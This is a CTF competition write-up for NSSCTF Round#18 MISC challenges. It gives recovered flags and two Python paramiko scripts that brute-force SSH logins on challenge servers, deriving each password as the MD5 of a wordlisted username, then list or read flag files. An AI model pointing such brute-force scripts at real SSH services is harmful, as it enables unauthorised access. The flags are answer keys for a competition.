---
title: '2024 NSSCTF Round#18 MISC Writeup'
description: '2024 NSSCTF Round#18 MISC 方向 Writeup。'
pubDate: 2024-06-10
author: 'IHK-1'
tags: ['CTF', 'NSSCTF', 'MISC', '2024']
---

# 温馨的酒吧
```plain
手动遍历所有结局
part: !@#$%&_CTFer!}
part: _不要停下来啊_
part: NSSCTF{新年快乐

拼接: NSSCTF{新年快乐_不要停下来啊_CTFer!}
```

#  number7
```plain
182A1918071C152E0A4737263A3E780A6F6A075A112742777C687D0700773F7D39560063487D

type7
NSSCTF{H4PPY_N3WY34r_4ND_N55CTF_18TH}
```

# userssssssss
```python
# 直接尝试连接并cat flag.txt

import paramiko
import hashlib

host = 'node2.anna.nssctf.cn'
port = 28914

def connect(user, password, i):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command('cat flag.txt')  # 0~307
        data = stdout.read()

        if len(data):
            print(f'[+] found! found at {i}! info: {user} {password} {data}')

    except:  # 当报错停止时，记录报错位置，再次运行时手动修改for i in range(306, len(userlist)) 中 i 的爆破位置
        print(f'[-] error! stop at {i}! info: {user} {password}')
        exit(0)

userlist = open('./wordlist.txt').readlines()
for i in range(306, len(userlist)):
    user = userlist[i].strip()
    password = str(hashlib.md5(user.encode()).hexdigest())
    connect(user, password, i)

# [+] found! found at 122! info: laminous af9533540eaafd949e70f18ee0fabd47 b'NSSCTF{**************************}\n'
```

# usersssssssss_revenge
```python
# 由于增加了字典长度，以及flag文件名被修改，尝试以ls -al之后，然后  readlines的方法大致判断文件个数，若不是7个，比其他ssh用户目录中文件数不一样则包含flag文件

import paramiko
import hashlib

host = 'node2.anna.nssctf.cn'
port = 28176

def connect(user, password, i):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command('ls -al')  # 0~307
        data = stdout.readlines()

        if len(data) != 7:
            print(f'[+] found! found at {i}! info: {user} {password} {data}')

    except:
        print(f'[-] error! stop at {i}! info: {user} {password}')
        exit(0)

userlist = open('./wordlist.txt').readlines()
for i in range(83, len(userlist)):
    user = userlist[i].strip()
    password = str(hashlib.md5(user.encode()).hexdigest())
    connect(user, password, i)

# [+] found! found at 344! info: upon 44e5b2bc484331ea24afd85ecfb212c8 ['total 40\n', 'drwxr-x--- 1 upon upon  4096 Feb 14 07:02 .\n', 'drwxr-xr-x 1 root root 12288 Feb 14 03:06 ..\n', '-rw-r--r-- 1 upon upon   220 Jan  6  2022 .bash_logout\n', '-rw-r--r-- 1 upon upon  3771 Jan  6  2022 .bashrc\n', 'drwx------ 2 upon upon  4096 Feb 14 07:02 .cache\n', '-rwxrwx--- 1 upon upon    45 Feb 14 06:58 .flag.txt\n', '-rw-r--r-- 1 upon upon   807 Jan  6  2022 .profile\n']

# 连接用户 cat .flag.txt
```

